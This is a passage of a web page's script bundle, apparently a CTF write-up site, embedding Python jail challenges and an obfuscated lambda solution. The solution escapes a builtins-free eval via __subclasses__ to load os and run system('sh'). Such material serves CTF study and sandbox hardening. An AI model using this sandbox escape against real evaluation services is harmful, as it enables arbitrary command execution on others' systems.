    whitelist <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
        <span class="token string">'LOAD_CONST'</span><span class="token punctuation">,</span>
        <span class="token string">'BINARY_OP'</span><span class="token punctuation">,</span>
        <span class="token string">'COMPARE_OP'</span><span class="token punctuation">,</span>
        <span class="token string">'POP_JUMP_BACKWARD_IF_TRUE'</span><span class="token punctuation">,</span>
        <span class="token string">'RETURN_VALUE'</span><span class="token punctuation">,</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">for</span> instr <span class="token keyword">in</span> dis<span class="token punctuation">.</span>Bytecode<span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> instr<span class="token punctuation">.</span>opname <span class="token keyword">not</span> <span class="token keyword">in</span> whitelist<span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token boolean">False</span>

        <span class="token keyword">if</span> <span class="token string">'JUMP'</span> <span class="token keyword">in</span> instr<span class="token punctuation">.</span>opname <span class="token keyword">and</span> <span class="token keyword">not</span> <span class="token punctuation">(</span><span class="token number">0</span> <span class="token operator">&lt;=</span> instr<span class="token punctuation">.</span>argval <span class="token operator">&lt;</span> <span class="token builtin">len</span><span class="token punctuation">(</span>code<span class="token punctuation">.</span>co_code<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token boolean">False</span>

    <span class="token keyword">return</span> <span class="token boolean">True</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    _print<span class="token punctuation">,</span> _eval <span class="token operator">=</span> <span class="token keyword">print</span><span class="token punctuation">,</span> <span class="token builtin">eval</span>
    <span class="token comment"># try:</span>
    prog <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'Program: '</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    code <span class="token operator">=</span> types<span class="token punctuation">.</span>CodeType<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> prog<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">b''</span><span class="token punctuation">,</span> <span class="token string">b''</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">assert</span> is_valid<span class="token punctuation">(</span>code<span class="token punctuation">)</span>

    __builtins__<span class="token punctuation">.</span>__dict__<span class="token punctuation">.</span>clear<span class="token punctuation">(</span><span class="token punctuation">)</span>
    _print<span class="token punctuation">(</span>_eval<span class="token punctuation">(</span>code<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token comment"># except:</span>
    <span class="token comment">#     _print('Nice try!')</span></code>`,Cu,ka,Ie,De,i_,Lu,ia,q2='<code class="language-py"><span class="token comment"># TBA</span></code>',Tu,_a,Zp,__,Au,da,je,Ne,d_,Ou,fa,z2=`<code class="language-py"><span class="token keyword">from</span> types <span class="token keyword">import</span> CodeType

<span class="token keyword">def</span> <span class="token function">clear</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> CodeType<span class="token punctuation">(</span>
        code<span class="token punctuation">.</span>co_argcount<span class="token punctuation">,</span> code<span class="token punctuation">.</span>co_kwonlyargcount<span class="token punctuation">,</span> code<span class="token punctuation">.</span>co_nlocals<span class="token punctuation">,</span>
        code<span class="token punctuation">.</span>co_stacksize<span class="token punctuation">,</span> code<span class="token punctuation">.</span>co_flags<span class="token punctuation">,</span> code<span class="token punctuation">.</span>co_code<span class="token punctuation">,</span>
        <span class="token comment"># No consts for youuu</span>
        <span class="token builtin">tuple</span><span class="token punctuation">(</span>clear<span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> CodeType<span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token boolean">None</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> code<span class="token punctuation">.</span>co_consts<span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token comment"># No names for youuuu</span>
        <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        code<span class="token punctuation">.</span>co_varnames<span class="token punctuation">,</span> code<span class="token punctuation">.</span>co_filename<span class="token punctuation">,</span> code<span class="token punctuation">.</span>co_name<span class="token punctuation">,</span>
        code<span class="token punctuation">.</span>co_firstlineno<span class="token punctuation">,</span> code<span class="token punctuation">.</span>co_lnotab<span class="token punctuation">,</span> code<span class="token punctuation">.</span>co_freevars<span class="token punctuation">,</span>
        code<span class="token punctuation">.</span>co_cellvars
    <span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>clear<span class="token punctuation">(</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span><span class="token punctuation">,</span> __name__<span class="token punctuation">,</span> <span class="token string">"eval"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">'__builtins__'</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token builtin">getattr</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code>`,Fu,ma,Pe,He,f_,Ru,ba,W2=`<code class="language-py">@ juliapoo
<span class="token keyword">lambda</span> g<span class="token punctuation">:</span> <span class="token punctuation">(</span>
    <span class="token punctuation">(</span><span class="token keyword">lambda</span> _0<span class="token punctuation">,</span> _1<span class="token punctuation">:</span>
        <span class="token punctuation">(</span><span class="token keyword">lambda</span> _2<span class="token punctuation">,</span> _4<span class="token punctuation">,</span> _8<span class="token punctuation">,</span> _16<span class="token punctuation">,</span> _32<span class="token punctuation">,</span> _64<span class="token punctuation">,</span> _128<span class="token punctuation">:</span>
        <span class="token punctuation">(</span><span class="token keyword">lambda</span> _1234567890<span class="token punctuation">:</span>
            <span class="token punctuation">(</span><span class="token keyword">lambda</span>
                s_n<span class="token punctuation">,</span>s_r<span class="token punctuation">,</span>s_a<span class="token punctuation">,</span>s_o<span class="token punctuation">,</span>s_t<span class="token punctuation">,</span>s_c<span class="token punctuation">,</span>s_l<span class="token punctuation">,</span>s_larr<span class="token punctuation">,</span>s_i<span class="token punctuation">,</span>s_g<span class="token punctuation">,</span>s_e<span class="token punctuation">,</span>s_b<span class="token punctuation">,</span>s_dash<span class="token punctuation">,</span>s_f<span class="token punctuation">,</span>s_ <span class="token punctuation">,</span>s_rarr<span class="token punctuation">,</span>s_u<span class="token punctuation">,</span>
                s_T<span class="token punctuation">,</span>
                s_F<span class="token punctuation">,</span>s_s<span class="token punctuation">,</span>
                s_lbrack<span class="token punctuation">,</span>s_rbrack<span class="token punctuation">,</span>
                s_4<span class="token punctuation">,</span>s_5<span class="token punctuation">,</span>s_9<span class="token punctuation">,</span>s_6<span class="token punctuation">,</span>s_3<span class="token punctuation">,</span>s_8<span class="token punctuation">,</span>s_2<span class="token punctuation">,</span>s_7<span class="token punctuation">,</span>s_0<span class="token punctuation">,</span>s_1<span class="token punctuation">,</span>
                s_x<span class="token punctuation">,</span>s_j<span class="token punctuation">,</span>s_N<span class="token punctuation">:</span>
                <span class="token punctuation">(</span><span class="token keyword">lambda</span> morestr<span class="token punctuation">:</span>
                    <span class="token punctuation">(</span><span class="token keyword">lambda</span> s_d<span class="token punctuation">,</span>s_m<span class="token punctuation">,</span>s_h<span class="token punctuation">:</span>
                        <span class="token punctuation">(</span><span class="token keyword">lambda</span> fromhex<span class="token punctuation">,</span> decodestr<span class="token punctuation">:</span>
                            <span class="token punctuation">(</span><span class="token keyword">lambda</span>
                                s__class__<span class="token punctuation">,</span>
                                s__bases__<span class="token punctuation">,</span>
                                s__subclasses__<span class="token punctuation">,</span>
                                s_load_module<span class="token punctuation">,</span>
                                s_system<span class="token punctuation">:</span>
                                <span class="token punctuation">(</span><span class="token keyword">lambda</span> load_module<span class="token punctuation">:</span>
                                    <span class="token punctuation">(</span><span class="token keyword">lambda</span> os<span class="token punctuation">:</span>
                                        <span class="token punctuation">(</span><span class="token keyword">lambda</span> system<span class="token punctuation">:</span> system<span class="token punctuation">(</span>s_s <span class="token operator">+</span> s_h<span class="token punctuation">)</span><span class="token punctuation">)</span>
                                        <span class="token punctuation">(</span>g<span class="token punctuation">(</span>os<span class="token punctuation">,</span> s_system<span class="token punctuation">)</span><span class="token punctuation">)</span>
                                    <span class="token punctuation">)</span><span class="token punctuation">(</span>load_module<span class="token punctuation">(</span>s_o <span class="token operator">+</span> s_s<span class="token punctuation">)</span><span class="token punctuation">)</span>
                                <span class="token punctuation">)</span><span class="token punctuation">(</span>g<span class="token punctuation">(</span>g<span class="token punctuation">(</span>g<span class="token punctuation">(</span>g<span class="token punctuation">(</span>g<span class="token punctuation">,</span> s__class__<span class="token punctuation">)</span><span class="token punctuation">,</span> s__bases__<span class="token punctuation">)</span><span class="token punctuation">[</span>_0<span class="token punctuation">]</span><span class="token punctuation">,</span> s__subclasses__<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span>_16<span class="token operator">+</span>_64<span class="token punctuation">]</span><span class="token punctuation">,</span> s_load_module<span class="token punctuation">)</span><span class="token punctuation">)</span>
                            <span class="token punctuation">)</span><span class="token punctuation">(</span>
                                g<span class="token punctuation">(</span>fromhex<span class="token punctuation">(</span>s_5<span class="token operator">+</span>s_f<span class="token operator">+</span>s_5<span class="token operator">+</span>s_f<span class="token operator">+</span>s_6<span class="token operator">+</span>s_3<span class="token operator">+</span>s_6<span class="token operator">+</span>s_c<span class="token operator">+</span>s_6<span class="token operator">+</span>s_1<span class="token operator">+</span>s_7<span class="token operator">+</span>s_3<span class="token operator">+</span>s_7<span class="token operator">+</span>s_3<span class="token operator">+</span>s_5<span class="token operator">+</span>s_f<span class="token operator">+</span>s_5<span class="token operator">+</span>s_f<span class="token punctuation">)</span><span class="token punctuation">,</span> decodestr<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                                g<span class="token punctuation">(</span>fromhex<span class="token punctuation">(</span>s_5<span class="token operator">+</span>s_f<span class="token operator">+</span>s_5<span class="token operator">+</span>s_f<span class="token operator">+</span>s_6<span class="token operator">+</span>s_2<span class="token operator">+</span>s_6<span class="token operator">+</span>s_1<span class="token operator">+</span>s_7<span class="token operator">+</span>s_3<span class="token operator">+</span>s_6<span class="token operator">+</span>s_5<span class="token operator">+</span>s_7<span class="token operator">+</span>s_3<span class="token operator">+</span>s_5<span class="token operator">+</span>s_f<span class="token operator">+</span>s_5<span class="token operator">+</span>s_f<span class="token punctuation">)</span><span class="token punctuation">,</span> decodestr<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                                g<span class="token punctuation">(</span>fromhex<span class="token punctuation">(</span>s_5<span class="token operator">+</span>s_f<span class="token operator">+</span>s_5<span class="token operator">+</span>s_f<span class="token operator">+</span>s_7<span class="token operator">+</span>s_3<span class="token operator">+</span>s_7<span class="token operator">+</span>s_5<span class="token operator">+</span>s_6<span class="token operator">+</span>s_2<span class="token operator">+</span>s_6<span class="token operator">+</span>s_3<span class="token operator">+</span>s_6<span class="token operator">+</span>s_c<span class="token operator">+</span>s_6<span class="token operator">+</span>s_1<span class="token operator">+</span>s_7<span class="token operator">+</span>s_3<span class="token operator">+</span>s_7<span class="token operator">+</span>s_3<span class="token operator">+</span>s_6<span class="token operator">+</span>s_5<span class="token operator">+</span>s_7<span class="token operator">+</span>s_3<span class="token operator">+</span>s_5<span class="token operator">+</span>s_f<span class="token operator">+</span>s_5<span class="token operator">+</span>s_f<span class="token punctuation">)</span><span class="token punctuation">,</span> decodestr<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                                g<span class="token punctuation">(</span>fromhex<span class="token punctuation">(</span>s_6<span class="token operator">+</span>s_c<span class="token operator">+</span>s_6<span class="token operator">+</span>s_f<span class="token operator">+</span>s_6<span class="token operator">+</span>s_1<span class="token operator">+</span>s_6<span class="token operator">+</span>s_4<span class="token operator">+</span>s_5<span class="token operator">+</span>s_f<span class="token operator">+</span>s_6<span class="token operator">+</span>s_d<span class="token operator">+</span>s_6<span class="token operator">+</span>s_f<span class="token operator">+</span>s_6<span class="token operator">+</span>s_4<span class="token operator">+</span>s_7<span class="token operator">+</span>s_5<span class="token operator">+</span>s_6<span class="token operator">+</span>s_c<span class="token operator">+</span>s_6<span class="token operator">+</span>s_5<span class="token punctuation">)</span><span class="token punctuation">,</span> decodestr<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                                g<span class="token punctuation">(</span>fromhex<span class="token punctuation">(</span>s_7<span class="token operator">+</span>s_3<span class="token operator">+</span>s_7<span class="token operator">+</span>s_9<span class="token operator">+</span>s_7<span class="token operator">+</span>s_3<span class="token operator">+</span>s_7<span class="token operator">+</span>s_4<span class="token operator">+</span>s_6<span class="token operator">+</span>s_5<span class="token operator">+</span>s_6<span class="token operator">+</span>s_d<span class="token punctuation">)</span><span class="token punctuation">,</span> decodestr<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
                            <span class="token punctuation">)</span>
                        <span class="token punctuation">)</span><span class="token punctuation">(</span>g<span class="token punctuation">(</span>g<span class="token punctuation">(</span>s_5<span class="token operator">+</span>s_f<span class="token punctuation">,</span> s_e<span class="token operator">+</span>s_n<span class="token operator">+</span>s_c<span class="token operator">+</span>s_o<span class="token operator">+</span>s_d<span class="token operator">+</span>s_e<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> s_f<span class="token operator">+</span>s_r<span class="token operator">+</span>s_o<span class="token operator">+</span>s_m<span class="token operator">+</span>s_h<span class="token operator">+</span>s_e<span class="token operator">+</span>s_x<span class="token punctuation">)</span><span class="token punctuation">,</span> s_d<span class="token operator">+</span>s_e<span class="token operator">+</span>s_c<span class="token operator">+</span>s_o<span class="token operator">+</span>s_d<span class="token operator">+</span>s_e<span class="token punctuation">)</span>
                    <span class="token punctuation">)</span><span class="token punctuation">(</span>morestr<span class="token punctuation">[</span>_1<span class="token operator">+</span>_2<span class="token operator">+</span>_4<span class="token operator">+</span>_8<span class="token punctuation">]</span><span class="token punctuation">,</span>morestr<span class="token punctuation">[</span>_2<span class="token operator">+</span>_8<span class="token punctuation">]</span><span class="token punctuation">,</span>morestr<span class="token punctuation">[</span>_1<span class="token operator">+</span>_4<span class="token operator">+</span>_8<span class="token punctuation">]</span><span class="token punctuation">)</span>
                <span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"&#123;g(&#123;&#125;, s_g+s_e+s_t)&#125;"</span></span><span class="token punctuation">)</span>
            <span class="token punctuation">)</span><span class="token punctuation">(</span>
                <span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>g<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">[</span>_8<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>g<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">[</span>_1<span class="token operator">+</span>_8<span class="token operator">+</span>_16<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>g<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">[</span>_2<span class="token operator">+</span>_4<span class="token operator">+</span>_16<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>g<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">[</span>_16<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>g<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">[</span>_1<span class="token operator">+</span>_4<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>g<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">[</span>_1<span class="token operator">+</span>_4<span class="token operator">+</span>_8<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>g<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">[</span>_4<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>g<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">[</span>_0<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>g<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">[</span>_1<span class="token operator">+</span>_2<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>g<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">[</span>_1<span class="token operator">+</span>_2<span class="token operator">+</span>_16<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>g<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">[</span>_4<span class="token operator">+</span>_16<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>g<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">[</span>_1<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>g<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">[</span>_2<span class="token operator">+</span>_4<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>g<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">[</span>_2<span class="token operator">+</span>_8<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>g<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">[</span>_1<span class="token operator">+</span>_8<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>g<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">[</span>_2<span class="token operator">+</span>_8<span class="token operator">+</span>_16<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>g<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">[</span>_2<span class="token punctuation">]</span><span class="token punctuation">,</span>
                <span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>g<span class="token operator">==</span>g<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">[</span>_0<span class="token punctuation">]</span><span class="token punctuation">,</span>
                <span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>g<span class="token operator">!=</span>g<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">[</span>_0<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>g<span class="token operator">!=</span>g<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">[</span>_1<span class="token operator">+</span>_2<span class="token punctuation">]</span><span class="token punctuation">,</span>
                <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token operator">*</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>g<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">[</span>_0<span class="token punctuation">:</span>_0<span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">[</span>_1<span class="token operator">+</span>_2<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token operator">*</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>g<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">[</span>_0<span class="token punctuation">:</span>_0<span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">[</span>_4<span class="token punctuation">]</span><span class="token punctuation">,</span>
                <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>_1234567890<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">[</span>_1<span class="token operator">+</span>_2<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>_1234567890<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">[</span>_4<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>_1234567890<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">[</span>_8<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>_1234567890<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">[</span>_1<span class="token operator">+</span>_4<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>_1234567890<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">[</span>_2<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>_1234567890<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">[</span>_1<span class="token operator">+</span>_2<span class="token operator">+</span>_4<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>_1234567890<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">[</span>_1<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>_1234567890<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">[</span>_2<span class="token operator">+</span>_4<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>_1234567890<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">[</span>_1<span class="token operator">+</span>_8<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>_1234567890<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">[</span>_0<span class="token punctuation">]</span><span class="token punctuation">,</span>
                <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token keyword">lambda</span><span class="token punctuation">:</span><span class="token punctuation">(</span><span class="token keyword">yield</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">[</span>_1<span class="token operator">+</span>_2<span class="token operator">+</span>_8<span class="token operator">+</span>_16<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token keyword">lambda</span><span class="token punctuation">:</span><span class="token punctuation">(</span><span class="token keyword">yield</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">[</span>_1<span class="token operator">+</span>_4<span class="token operator">+</span>_8<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token keyword">lambda</span><span class="token punctuation">:</span><span class="token punctuation">(</span><span class="token keyword">yield</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">[</span>_2<span class="token operator">+</span>_16<span class="token punctuation">]</span>
            <span class="token punctuation">)</span>
        <span class="token punctuation">)</span><span class="token punctuation">(</span>_2<span class="token operator">+</span>_16<span class="token operator">+</span>_64<span class="token operator">+</span>_128<span class="token operator">+</span><span class="token punctuation">(</span>_1<span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span>_1<span class="token operator">+</span>_8<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>_1<span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span>_1<span class="token operator">+</span>_16<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>_1<span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span>_2<span class="token operator">+</span>_16<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>_1<span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span>_4<span class="token operator">+</span>_16<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>_1<span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span>_1<span class="token operator">+</span>_2<span class="token operator">+</span>_4<span class="token operator">+</span>_16<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>_1<span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span>_8<span class="token operator">+</span>_16<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>_1<span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span>_1<span class="token operator">+</span>_2<span class="token operator">+</span>_8<span class="token operator">+</span>_16<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>_1<span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span>_2<span class="token operator">+</span>_4<span class="token operator">+</span>_8<span class="token operator">+</span>_16<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
